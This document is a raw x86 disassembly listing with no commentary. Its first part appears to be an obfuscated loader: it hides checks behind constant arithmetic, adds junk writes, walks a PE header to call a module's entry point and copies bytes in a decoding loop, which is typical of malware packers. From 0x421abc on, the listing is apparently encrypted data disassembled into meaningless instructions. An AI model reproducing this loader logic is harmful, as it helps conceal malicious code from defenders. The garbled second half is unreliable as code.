  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42a9f7
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx+0x28bd524a],al
  421ace:	adc    edx,DWORD PTR [esi-0x7d499052]
  421ad4:	sbb    DWORD PTR [edx+0x60],0xffffff83
  421ad8:	or     esp,0x55
  421adb:	or     al,0x73
  421add:	sar    esp,cl
  421adf:	ja     0x421b40
  421ae1:	sbb    BYTE PTR [esi+0x70],bl
  421ae4:	sti    
  421ae5:	pop    ds
  421ae6:	pusha  
  421ae7:	and    edi,eax
  421ae9:	loop   0x421afa
  421aeb:	(bad)  
  421aec:	out    0x6c,al
  421aee:	push   ebp
  421aef:	mov    ecx,0x5e149144
  421af4:	lea    ebp,[edx]
  421af6:	mov    ebp,0xbafb2b41
  421afb:	hlt    
  421afc:	fdivr  QWORD PTR [ecx]
  421afe:	mov    BYTE PTR [esi],cl
  421b00:	ss mov esp,0x5a5fcbb4
  421b06:	xchg   ebp,eax
  421b07:	push   ss
  421b08:	imul   ebp,DWORD PTR [edx-0x6e4c8a29],0xffffff9f
  421b0f:	inc    eax
  421b10:	xchg   ebx,eax
  421b11:	inc    esp
  421b12:	popf   
  421b13:	cmp    DWORD PTR [ebx],ebp
  421b15:	sbb    edi,DWORD PTR [ecx-0x1d9e046]
  421b1b:	fldlg2 
  421b1d:	in     al,0xfd
  421b1f:	add    BYTE PTR [edx-0x78],ch
  421b22:	imul   ecx,ebp,0xfffffffd
  421b25:	mov    ecx,0xcd5c668
  421b2a:	mov    ds:0x7f423dd5,eax
  421b2f:	cmp    DWORD PTR [eax+ecx*1],ebp
  421b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b33:	test   BYTE PTR [esi-0xaa85312],dh
  421b39:	out    dx,al
  421b3a:	call   0x7bd4eafe
  421b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b40:	mov    BYTE PTR [esi],dh
  421b42:	call   0xb9b7:0x4101bcb4
  421b49:	or     cl,BYTE PTR [ebx-0x16]
  421b4c:	and    eax,0x9f9e9564
  421b51:	shl    BYTE PTR [ecx-0x31956395],cl
  421b57:	(bad)  
  421b59:	lds    edi,FWORD PTR [edx]
  421b5b:	leave  
  421b5c:	mov    ah,0xae
  421b5e:	popa   
  421b5f:	mov    edx,0x99feedbd
  421b64:	cdq    
  421b65:	xchg   ebx,eax
  421b66:	add    ebp,edx
  421b68:	es push es
  421b6a:	loope  0x421bbc
  421b6c:	mov    ds:0x470a369a,eax
  421b71:	in     al,dx
  421b72:	add    al,0x59
  421b74:	adc    esi,DWORD PTR [ecx-0x278d4c7c]
  421b7a:	xchg   ebx,eax
  421b7b:	mov    ch,0xe1
  421b7d:	jnp    0x421b94
  421b7f:	add    eax,0x6e7f4d7a
  421b84:	sub    edx,esp
  421b86:	xchg   BYTE PTR [esi-0x50],dl
  421b89:	call   0xc53f:0xb35f1fb4
  421b90:	xchg   DWORD PTR [ecx+0x7e4b47c6],eax
  421b96:	xor    BYTE PTR [ebx+0x51e8da68],ch
  421b9c:	jnp    0x421bd2
  421b9e:	fiadd  WORD PTR [ecx-0x56]
  421ba1:	shr    DWORD PTR [edi],1
  421ba3:	xchg   edi,eax
  421ba4:	(bad)  
  421ba6:	sub    bh,dl
  421ba8:	adc    bl,cl
  421baa:	ret    0x966e
  421bad:	or     al,0x9c
  421baf:	outs   dx,DWORD PTR ds:[esi]
  421bb0:	xlat   BYTE PTR ds:[ebx]
  421bb2:	in     eax,dx
  421bb3:	adc    DWORD PTR [edx+0x19fb6a8c],edi
  421bb9:	and    al,0xb8
  421bbb:	sub    bl,al
  421bbd:	inc    ecx
  421bbe:	icebp  
  421bbf:	int3   
  421bc0:	push   ds
  421bc1:	cmp    ah,BYTE PTR [ecx-0x2b]
  421bc4:	imul   eax,ebp,0xfc896eb5
  421bca:	call   0xe1be061b
  421bcf:	xchg   DWORD PTR [edx+0x72],esi
  421bd2:	aas    
  421bd3:	sbb    BYTE PTR [edi-0x34],0x5b
  421bd7:	jbe    0x421b9a
  421bd9:	lods   al,BYTE PTR ds:[esi]
  421bda:	addr16 mov al,ds:0x4e8d
  421bde:	jp     0x421c34
  421be0:	cmp    al,dh
  421be2:	and    edx,0x11ed1529
  421be8:	lds    edx,FWORD PTR [eax-0x3f9b58fe]
  421bee:	cli    
  421bef:	add    eax,0x58687e10
  421bf4:	lds    edx,FWORD PTR [esi]
  421bf6:	jmp    0x26044c85
  421bfb:	jb     0x421bb1
  421bfd:	repz in al,0xfb
  421c00:	add    BYTE PTR [edi-0x69],bl
  421c03:	sub    BYTE PTR [esi+0x6f],dh
  421c06:	fwait
  421c07:	jo     0x421c6b
  421c09:	enterw 0x9d24,0xe2
  421c0e:	cwde   
  421c0f:	sbb    edx,DWORD PTR [ebp+0x2d]
  421c12:	fs push 0xffffffd1
  421c15:	or     al,0xec
  421c17:	or     eax,0x35a21081
  421c1c:	popf   
  421c1d:	rcl    BYTE PTR [ecx],0xb2
  421c20:	fwait
  421c21:	stos   DWORD PTR es:[edi],eax
  421c22:	fnsetpm(287 only) 
  421c24:	jp     0x421c95
  421c26:	xchg   ecx,eax
  421c27:	lock mov esp,DWORD PTR [ebx]
  421c2a:	jo     0x421bc8
  421c2c:	or     edx,edi
  421c2e:	or     DWORD PTR [edx-0x719aa36d],eax
  421c34:	cmc    
  421c35:	iret   
  421c36:	pushf  
  421c37:	pop    ebx
  421c38:	add    al,0xf3
  421c3a:	fld    TBYTE PTR es:[ebx]
  421c3d:	xchg   esi,eax
  421c3e:	jne    0x421bec
  421c40:	mov    es,esp
  421c42:	sbb    dh,BYTE PTR [ebx+ecx*4+0x7888f4c]
  421c49:	mov    edx,0x4e250bba
  421c4e:	inc    ecx
  421c4f:	pop    ebp
  421c50:	out    0x89,al
  421c52:	dec    ebp
  421c53:	xor    eax,0xbd09ba9e
  421c58:	loopne 0x421c8c
  421c5a:	call   0x95c3ba2b
  421c5f:	jmp    0xa8ed8cd
  421c64:	sub    al,0xab
  421c66:	mov    eax,0x2523eedf
  421c6b:	xchg   DWORD PTR [edx-0x5f],edi
  421c6e:	call   0x2893:0x992baff3
  421c75:	retf   0xb667
  421c78:	int    0x32
  421c7a:	int    0xf4
  421c7c:	xor    al,ch
  421c7e:	cdq    
  421c7f:	stos   BYTE PTR es:[edi],al
  421c80:	jg     0x421c92
  421c82:	pop    ebx
  421c83:	cmp    DWORD PTR [eax+0x34],ebp
  421c86:	xchg   ebx,eax
  421c87:	pushf  
  421c88:	inc    eax
  421c89:	sub    eax,0x5bf254e5
  421c8e:	push   ds
  421c8f:	enter  0x858c,0x1a
  421c93:	xor    al,BYTE PTR [ebx+0x64]
  421c96:	inc    esi
  421c97:	cwde   
  421c98:	xor    esi,DWORD PTR [esp+ebx*8+0x6dc4251]
  421c9f:	lods   al,BYTE PTR ds:[esi]
  421ca0:	mov    ch,0xac
  421ca2:	mov    eax,0xb98a6c3f
  421ca7:	add    eax,0x56350765
  421cac:	mov    dl,0x27
  421cae:	nop
  421caf:	mov    BYTE PTR [edx-0x735c3c3],dh
  421cb5:	rol    eax,cl
  421cb7:	push   esi
  421cb8:	lds    edx,FWORD PTR [ecx]
  421cba:	imul   esi,DWORD PTR [edx+0x54],0x35
  421cbe:	add    DWORD PTR [eax-0x3a],esp
  421cc1:	jmp    0x421d07
  421cc3:	lahf   
  421cc4:	out    0x1a,eax
  421cc6:	and    BYTE PTR [esi+0x6c264ee5],cl
  421ccc:	repz xor al,0x59
  421ccf:	adc    eax,0xfcfec875
  421cd4:	mov    ch,0xfe
  421cd6:	inc    esp
  421cd7:	lock repz dec ebx
  421cda:	mov    esp,0xcba8b169
  421cdf:	xchg   esp,eax
  421ce0:	mov    WORD PTR ds:0x935142d3,?
  421ce6:	ins    BYTE PTR es:[edi],dx
  421ce7:	int3   
  421ce8:	or     al,0x27
  421cea:	push   ebp
  421ceb:	pop    edi
  421cec:	pushf  
  421ced:	call   0x2e15fbad
  421cf2:	sbb    BYTE PTR [esp+edx*8-0x5a7a8d5b],bh
  421cf9:	pop    eax
  421cfa:	fnstsw WORD PTR [esi-0x373edf59]
  421d00:	mov    cl,0x35
  421d02:	and    BYTE PTR [edx-0x55],bh
  421d05:	lahf   
  421d06:	dec    esi
  421d07:	pusha  
  421d08:	or     al,BYTE PTR [edx+0x17]
  421d0b:	fld1   
  421d0d:	mov    dl,0x2
  421d0f:	mov    dl,0xaa
  421d11:	call   0xba5320af
  421d16:	call   0xabd2:0xe554c29a
  421d1d:	imul   edi,DWORD PTR [esi+0x1d],0xf96da4e8
  421d24:	inc    edx
  421d25:	icebp  
  421d26:	je     0x421d4c
  421d28:	add    al,BYTE PTR [eax-0x1a]
  421d2b:	mov    cl,0xc4
  421d2d:	imul   esp,DWORD PTR [eax-0x3b579405],0xfffffff2
  421d34:	fistp  QWORD PTR [ebx]
  421d36:	call   0x9910:0x85833909
  421d3d:	xor    al,0x38
  421d3f:	or     al,0xa9
  421d41:	lods   eax,DWORD PTR ds:[esi]
  421d42:	mov    dl,bh
  421d44:	addr16 out dx,eax
  421d46:	or     bl,BYTE PTR [edi-0x735e29e5]
  421d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d4d:	adc    BYTE PTR [eax+0x55e3004b],cl
  421d53:	cwde   
  421d54:	daa    
  421d55:	add    edx,DWORD PTR [ebx+0x3c]
  421d58:	sbb    dl,0x76
  421d5b:	loopne 0x421dd5
  421d5d:	mov    ds:0xbd436805,al
  421d62:	inc    edi
  421d63:	push   0xffffffe0
  421d65:	lods   eax,DWORD PTR ds:[esi]
  421d66:	sbb    al,0x8d
  421d68:	adc    ch,BYTE PTR [eax+0x2521debe]
  421d6e:	adc    edx,DWORD PTR ds:0x99e4d271
  421d74:	loope  0x421deb
  421d76:	adc    eax,0xc00a2c16
  421d7b:	test   eax,0x37ed910c
  421d80:	int3   
  421d81:	cmp    eax,0x8e7a4d53
  421d86:	repz sbb al,0x47
  421d89:	mov    ebx,es
  421d8b:	out    0x4a,al
  421d8d:	pusha  
  421d8e:	test   DWORD PTR [edi],0xb511d7f7
  421d94:	aaa    
  421d95:	mov    eax,DWORD PTR [esi+0x7f1c9f4]
  421d9b:	test   BYTE PTR [ebx-0x1d],ch
  421d9e:	pop    ss
  421d9f:	xchg   BYTE PTR [ebx-0x302d3c85],al
  421da5:	cmp    eax,0x853dc63c
  421daa:	(bad)  
  421dab:	ins    BYTE PTR es:[edi],dx
  421dac:	xchg   ebp,eax
  421dad:	adc    cl,ah
  421daf:	jnp    0x421d53
  421db1:	ret    
  421db2:	mov    al,ds:0x239d6ded
  421db7:	jecxz  0x421d89
  421db9:	pop    ebx
  421dba:	mov    eax,ds:0x6712d485
  421dbf:	stos   BYTE PTR es:[edi],al
  421dc0:	mov    eax,ds:0x7705540e
  421dc5:	xchg   ebx,eax
  421dc6:	push   ds
  421dc7:	push   0x810fc6ae
  421dcc:	sub    ah,BYTE PTR [ebp+0xc9c5bae]
  421dd2:	xchg   esp,eax
  421dd3:	mov    dh,0xf
  421dd5:	cwde   
  421dd6:	sbb    eax,0x61e53273
  421ddb:	inc    edx
  421ddc:	ds jns 0x421d8c
  421ddf:	push   es
  421de0:	pop    ebp
  421de1:	sti    
  421de2:	ja     0x421e2c
  421de4:	jp     0x421e5d
  421de6:	jg     0x421e42
  421de8:	lock bound ebp,QWORD PTR [ebp+0x18]
  421dec:	cmp    al,0x70
  421dee:	out    0x7b,eax
  421df0:	push   0x4f
  421df2:	mov    eax,0x5658b4da
  421df7:	inc    ebp
  421df8:	lea    eax,[eax+0x5f]
  421dfb:	push   ds
  421dfc:	out    dx,eax
  421dfd:	loop   0x421d89
  421dff:	mov    ds:0x4a59b5a7,al
  421e04:	loope  0x421e37
  421e06:	nop
  421e07:	and    cl,BYTE PTR [ecx]
  421e09:	sbb    al,0x25
  421e0b:	mov    WORD PTR [edi-0x51],gs
  421e0e:	gs dec ecx
  421e10:	call   0x4388:0xeb369e2d
  421e17:	hlt    
  421e18:	xchg   DWORD PTR [edi+0x783c1ba3],ebx
  421e1e:	ja     0x421e5f
  421e20:	(bad)  
  421e21:	add    al,0xb7
  421e23:	iret   
  421e24:	aaa    
  421e25:	sub    BYTE PTR [edi+ecx*1],bl
  421e28:	fwait
  421e29:	jae    0x421e94
  421e2b:	cmp    bh,BYTE PTR [esi]
  421e2d:	sbb    ch,BYTE PTR [ecx+0x13]
  421e30:	or     DWORD PTR [eax+ebx*4-0x6b116df6],0x26
  421e38:	sbb    edi,DWORD PTR [ecx-0x11b3b59]
  421e3e:	push   ebp
  421e3f:	jb     0x421e74
  421e41:	xchg   esi,eax
  421e42:	(bad)  
  421e43:	and    al,0x53
  421e45:	push   es
  421e46:	push   esp
  421e47:	ret    
  421e48:	cs (bad) 
  421e4a:	pop    esi
  421e4b:	imul   ecx,DWORD PTR [edx],0x1596a8d1
  421e51:	cwde   
  421e52:	out    dx,eax
  421e53:	add    BYTE PTR [ebp-0x44],bh
  421e56:	pop    esi
  421e57:	cmp    DWORD PTR ds:0x7634e4f3,eax
  421e5d:	cs dec esi
  421e5f:	jae    0x421dfa
  421e61:	imul   DWORD PTR [edx-0x51]
  421e64:	es fucomi st,st(6)
  421e67:	push   esp
  421e68:	add    edx,DWORD PTR [ebx+0x431e8827]
  421e6e:	jmp    0x421eaa
  421e70:	sub    DWORD PTR [eax],edi
  421e72:	pusha  
  421e73:	sub    DWORD PTR [ecx],ebp
  421e75:	out    0x4d,eax
  421e77:	mov    ebp,0x6dae2093
  421e7c:	out    dx,eax
  421e7d:	xor    BYTE PTR [ebp+ebp*8-0x1322693b],dh
  421e84:	xchg   edx,eax
  421e85:	jecxz  0x421ecf
  421e87:	dec    edx
  421e88:	and    al,0x86
  421e8a:	add    DWORD PTR [ebx],ecx
  421e8c:	or     BYTE PTR [esi],0x4f
  421e8f:	enter  0xfb13,0xe0
  421e93:	nop
  421e94:	imul   edx,DWORD PTR [esp+ebp*4-0x37],0x8c87a38f
  421e9c:	pop    ebp
  421e9d:	xor    DWORD PTR [esi-0x3c],esp
  421ea0:	ficomp DWORD PTR [esi]
  421ea2:	adc    eax,0xb49df12d
  421ea7:	pop    ds
  421ea8:	outs   dx,DWORD PTR ds:[esi]
  421ea9:	mov    eax,ds:0xd728b525
  421eae:	xchg   ebx,eax
  421eaf:	inc    ecx
  421eb0:	pusha  
  421eb1:	sbb    al,BYTE PTR [ebp+0x48131ec9]
  421eb7:	into   
  421eb8:	mov    ch,0x67
  421eba:	and    al,0xf1
  421ebc:	lahf   
  421ebd:	sahf   
  421ebe:	pop    ecx
  421ebf:	inc    ecx
  421ec0:	std    
  421ec1:	adc    eax,0x367e71dc
  421ec6:	mov    edi,0x7d04100e
  421ecb:	inc    BYTE PTR [eax]
  421ecd:	dec    ebp
  421ece:	data16 je 0x421eb2
  421ed1:	add    BYTE PTR [edx],0xe5
  421ed4:	pop    ds
  421ed5:	cmp    BYTE PTR [ebx+0x21],al
  421ed8:	add    al,0x39
  421eda:	adc    bh,dh
  421edc:	popa   
  421edd:	jne    0x421e6d
  421edf:	imul   edx,DWORD PTR [eax+0x1d2f17be],0x3b
  421ee6:	mov    dh,0x5a
  421ee8:	pop    ebp
  421ee9:	ror    DWORD PTR [ecx+0x3bac4809],1
  421eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ef0:	lds    edx,FWORD PTR [ebp-0x698336d4]
  421ef6:	cmp    edx,0x32021346
  421efc:	fiadd  DWORD PTR [ebp-0x2c63f17f]
  421f02:	outs   dx,BYTE PTR ds:[esi]
  421f03:	jecxz  0x421f64
  421f05:	and    edi,edx
  421f07:	cmc    
  421f08:	cmp    dl,al
  421f0a:	in     al,dx
  421f0b:	pop    edi
  421f0c:	pop    esi
  421f0d:	add    DWORD PTR [edi],ebp
  421f0f:	data16 and BYTE PTR [edx+eax*1],ah
  421f13:	push   esp
  421f14:	aas    
  421f15:	fadd   DWORD PTR [edi-0x6a]
  421f18:	fbld   TBYTE PTR [edi+0x18]
  421f1b:	mov    ecx,0xfa78d360
  421f20:	lea    ecx,[esp+ebx*1]
  421f23:	call   0xa6fc573
  421f28:	add    dl,BYTE PTR [edi]
  421f2a:	ins    DWORD PTR es:[edi],dx
  421f2b:	in     eax,dx
  421f2c:	jbe    0x421f27
  421f2e:	in     al,0xaa
  421f30:	jge    0x421f27
  421f32:	pop    eax
  421f33:	repz test edx,0xd0a891d5
  421f3a:	pop    edi
  421f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f3c:	stos   BYTE PTR es:[edi],al
  421f3d:	div    ch
  421f3f:	mov    dh,0x4f
  421f41:	adc    esp,DWORD PTR [esi]
  421f43:	test   eax,ebp
  421f45:	mov    edx,?
  421f47:	sti    
